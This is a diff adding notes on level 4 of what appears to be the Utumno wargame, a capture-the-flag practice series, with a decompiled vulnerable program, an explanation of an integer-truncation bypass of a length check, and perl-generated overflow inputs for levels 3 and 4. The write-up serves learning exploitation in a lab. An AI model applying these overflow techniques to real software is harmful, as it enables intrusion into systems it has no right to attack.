@@ -249,3 +249,33 @@ return address. Exploit below uses 0xffffd500
 perl -e 'print "\x24\x00\x26\xd5\x20\xff\x2e\xff"' | ./utumno3
 
 ###################################################################################################
+
+Level:    4
+Exploit:  
+Password: 
+
+Program requires 2 args otherwise segfaults. Decompiling shows the following:
+	int main(int argc,char **argv) {
+		int val;
+		char b [64];
+		char c [65212];
+		ushort j;
+		int i;
+		
+		val = atoi(argv[1]);
+		if (63 < (ushort)val) {   <-- condition length check 
+			exit(1);
+		}
+		memcpy(b,argv[2],val);
+		return 0;
+	}
+
+Program copies second arg of length defined by first arg somewhere in memory. This can obviously
+be used to overwrite memory perhaps return address. To pass condition only the last 2 bytes must
+be less than 63 not the entire argument 1.
+A large value such as 65536 is out of range and thus (ushort)val will be 0, <= 63.
+
+For example input of ./utumno4 65536 (perl -e 'print "\x41"x65535') will cause a segfault because
+it will have overwritten the return address
+
+###################################################################################################
